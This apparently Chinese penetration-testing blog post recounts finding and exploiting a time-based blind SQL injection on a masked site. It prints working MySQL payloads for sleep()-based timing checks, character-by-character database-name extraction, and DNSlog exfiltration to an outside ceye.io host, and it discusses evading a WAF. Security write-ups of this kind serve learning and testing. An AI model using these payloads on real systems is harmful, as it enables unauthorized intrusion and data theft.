---
title: 记一次基于时间的SQL盲注
date: 2019-08-20 23:04:38
tags: 实战经验
categories: 实战渗透
---
## 废话
&#160; &#160; &#160; &#160;最近一阵子在上家公司天天加班，都没时间记录学习的内容，所以近几个月来一直没有发表什么文章，直接结果就是圈子账号被办了。

[![mYjQ2t.th.jpg](https://s2.ax1x.com/2019/08/20/mYjQ2t.th.jpg)](https://imgchr.com/i/mYjQ2t)

&#160; &#160; &#160; &#160;最近才刚换工作到上海出差，刚好今天遇到一个基于时间的sql盲注就记录一下吧，很多时候可能遇到了，直接丢sqlmap跑不出来就放弃了。但是今天亲自研究了一下才发现，sqlmap有时候对于盲注也是无奈的。
<!--more-->
## 正文
&#160; &#160; &#160; &#160;废话不多说了，事情的经过是这样的，一个项目，在测试系统的时候打开url一看，就一个静态页面，其他啥玩意儿都没有，第一时间想的就是：

[![mYvueU.th.jpg](https://s2.ax1x.com/2019/08/20/mYvueU.th.jpg)](https://imgchr.com/i/mYvueU)

&#160; &#160; &#160; &#160;然后，抱着工作求稳的心态，上了一波Linux最新版本的AWVS12破解版。丢进去就去搞其他系统去了。等到中午的时候回来一看，出现了一个这玩意儿：

[![mYv5fs.th.png](https://s2.ax1x.com/2019/08/20/mYv5fs.th.png)](https://imgchr.com/i/mYv5fs)

&#160; &#160; &#160; &#160;SQL盲注一枚，然后直接就丢sqlmap去了，但是这个在sqlmap里面跑的结果是啥都没出来的，然后因为是外网，还有IPS/WAF的存在，导致没有任何结果，无奈准备放弃，后来同事过来看了一眼，说要不试试？好吧，就开始了漫长的验证之旅。
## 漏洞验证
&#160; &#160; &#160; &#160;根据AWVS的payload在火狐里面测试了一波，确实存在注入：
payload：

`
http://xxx.xxx.xxxx/aaa/bbb/ccc/ddd/insert.php?dept=0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z
`

改变payload判断数据库名长度：

`
http://xxx.xxx.xxxx/aaa/bbb/ccc/ddd//insert.php?dept=0'XOR(if(length(database())=8,sleep(5),0))XOR'q
`

&#160; &#160; &#160; &#160;这里解释一下，第一个payload，是AWVS给出的测试payload，当你改变sleep（）的时间，响应的时间也会改变,这一句if(now()=sysdate(),sleep(0),0)的意思是，如果当前时间等于系统时间，则马上执行，否则输出0，也就是无结果，当我们改变这个sleep()的时间长短时，这个执行时间也会跟着改变，比如改为if(now()=sysdate(),sleep(5),0)也就是延迟5秒执行。所以，我们可以以此判断出这个基于时间的盲注是存在的。接着第二个payload意思就更加明显了。也就是当数据库名长度等于8的时候，延迟5秒执行，刚好这里我测试出来就是8，下一步就是判断数据库名字了。
### 补充一个重点
&#160; &#160; &#160; &#160;上面有个重点讲掉了，sleep()这个函数在数据库中，如果查询语句不成立的话，它就会马上返回结果，不加以执行，但是如果查询语句成立，这个sleep()延时函数才生效，如果前面的查询语句不成立或者所查询的数据没有，那么这个sleep()函数就不会执行，直接返回结果。所以这个sleep()函数在payload中和前面的查询语句相当于一个and的关系，也可以理解为if()这个判断，判断前面的查询语句成立，执行延迟，否则直接返回结果。还有一点就是，基于时间的盲注或者是基于布尔的盲注在页面上面看起来是没有任何变化的，只有根据时间的延迟和返回页面的正常不正常来判断。（此段补充，老鸟直接略过。。。。。。。。）

[![mYx8Ag.th.png](https://s2.ax1x.com/2019/08/20/mYx8Ag.th.png)](https://imgchr.com/i/mYx8Ag)

## 判断数据库名
&#160; &#160; &#160; &#160;直接上payload：

`
http://xxx.xxx.xxxx/aaa/bbb/ccc/ddd//insert.php?dept=0'XOR(if(ascii(substr(database(),1,1))=119,sleep(5),0))XOR'q
`

这里面的ascii(substr(database(),1,1))=119的意思是，判断数据库名字的第一个字母是不是为ascii表里的119也就是w，这里判断出来刚好是，延迟了五秒执行。同样的道理，一步步慢慢判断。当然，到这里我们已经可以证明存在基于时间的sql盲注了，直接用工具获取数据库名，我这里用到的是DNSlog来获取的，原因是因为这个网站存在waf，一直测试下去可能会封你的IP，但是DNSlog可以理解为一个IP代理池，也就是DNSlog注入。有一个免费的DNSlog平台，用telnet404账号登录：[http://ceye.io/](http://ceye.io/)
注册后到控制面板会给你一个二级域名：xxx.ceye.io,当我们把注入信息放到三级域名那里，后台的日志会记录下来

[![mtFcXd.th.png](https://s2.ax1x.com/2019/08/21/mtFcXd.th.png)](https://imgchr.com/i/mtFcXd)

然后再构造一个payload获取数据库名：

`
http://xxx.xxx.xxxx/aaa/bbb/ccc/ddd//insert.php?dept=0'XOR(select load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc')))XOR'q
`

如图所示：

[![mtkGUP.th.png](https://s2.ax1x.com/2019/08/21/mtkGUP.th.png)](https://imgchr.com/i/mtkGUP)

如果还不明白DNSlog注入是怎么回事，可以看看这篇帖子[https://www.cnblogs.com/afanti/p/8047530.html](https://www.cnblogs.com/afanti/p/8047530.html)
## 总结
&#160; &#160; &#160; &#160;很多时候，其实漏洞就在那里摆着，只是自己姿势不够而已，本文也只是自己在记载实战过程中遇到的问题和与同事沟通请教后的获得，记录一下，老鸟略过。
